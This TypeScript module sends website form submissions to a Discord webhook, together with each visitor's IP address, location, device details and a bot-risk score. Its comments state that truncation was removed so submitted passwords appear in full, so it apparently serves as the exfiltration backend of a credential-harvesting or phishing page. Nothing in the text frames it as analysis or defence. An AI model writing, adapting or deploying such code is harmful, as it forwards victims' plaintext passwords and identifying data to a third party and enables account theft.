type DiscordField = {
  name: string;
  value: string;
  inline?: boolean;
};

function isDiscordWebhookUrl(value: string) {
  try {
    const url = new URL(value);
    return (
      url.protocol === "https:" &&
      ["discord.com", "discordapp.com"].includes(url.hostname) &&
      url.pathname.startsWith("/api/webhooks/")
    );
  } catch {
    return false;
  }
}

function fieldValueToString(name: string, value: unknown) {
  // Handle objects with a .value property (common in form wrappers).
  // Extract and show ONLY that inner string so passwords don't get JSON-stringified.
  if (value && typeof value === "object" && !Array.isArray(value)) {
    const objectValue = value as { value?: unknown };

    if (objectValue.value !== undefined && objectValue.value !== null) {
      // Removed truncation so passwords (and all values) display fully.
      return String(objectValue.value);
    }

    return JSON.stringify(value);
  }

  // Only treat true null/undefined as empty. Empty strings are preserved
  // as valid plain text (Discord accepts non-empty values only, so callers
  // should avoid sending literal "" if possible).
  if (value === undefined || value === null) {
    return "(empty)";
  }

  // Removed .slice(0, 900) so nothing is truncated/redacted.
  return String(value);
}

function metadataFields(metadata: unknown) {
  if (!metadata || typeof metadata !== "object" || Array.isArray(metadata)) {
    return [];
  }

  const fields = (metadata as { fields?: unknown }).fields;

  if (!fields || typeof fields !== "object" || Array.isArray(fields)) {
    return [];
  }

  // Removed .slice(0, 12) so fields (including passwords) aren't silently dropped.
  // Discord natively enforces a 25-field limit per embed; we let Discord handle that.
  return Object.entries(fields).map(([name, value]) => ({
    name,
    value: fieldValueToString(name, value),
    inline: false,
  }));
}

export function validateDiscordWebhookUrl(value: string) {
  return isDiscordWebhookUrl(value.trim());
}

export function maskedWebhookUrl(value: string | null | undefined) {
  if (!value) {
    return null;
  }

  return value.replace(/\/([^/]{6})[^/]*\/([^/]{6})[^/]*$/, "/$1.../$2...");
}

export async function sendDiscordFormSubmission(input: {
  webhookUrl: string | null | undefined;
  host: string;
  slug: string;
  path: string;
  ipAddress: string;
  country: string;
  city: string;
  browser: string;
  os: string;
  device: string;
  referrer: string;
  isBot: boolean;
  botReason?: string | null;
  riskScore: number;
  metadata: unknown;
}) {
  if (!input.webhookUrl || !isDiscordWebhookUrl(input.webhookUrl)) {
    return { ok: false, status: 400, error: "Invalid Discord webhook URL." };
  }

  const fields: DiscordField[] = [
    { name: "Page", value: `${input.host}/${input.slug}${input.path}`, inline: false },
    { name: "IP", value: input.ipAddress, inline: true },
    { name: "Location", value: `${input.city}, ${input.country}`, inline: true },
    { name: "Device", value: `${input.device} / ${input.browser} / ${input.os}`, inline: false },
    { name: "Referrer", value: input.referrer || "Direct", inline: false },
    {
      name: "Traffic Quality",
      value: input.isBot ? `Bot/high risk: ${input.botReason || `Risk ${input.riskScore}`}` : `Risk ${input.riskScore}`,
      inline: false,
    },
    ...metadataFields(input.metadata),
  ];

  try {
    const response = await fetch(input.webhookUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        username: "Link Platform",
        embeds: [
          {
            title: "New Form Submission",
            color: input.isBot || input.riskScore >= 75 ? 15_116_280 : 3_443_003,
            timestamp: new Date().toISOString(),
            fields,
          },
        ],
      }),
    });

    if (!response.ok) {
      const errorText = await response.text().catch(() => "");
      return {
        ok: false,
        status: response.status,
        error: errorText.slice(0, 240) || `Discord rejected webhook with status ${response.status}.`,
      };
    }

    return { ok: true, status: response.status };
  } catch (error) {
    return {
      ok: false,
      status: 0,
      error: error instanceof Error ? error.message : "Discord webhook request failed.",
    };
  }
}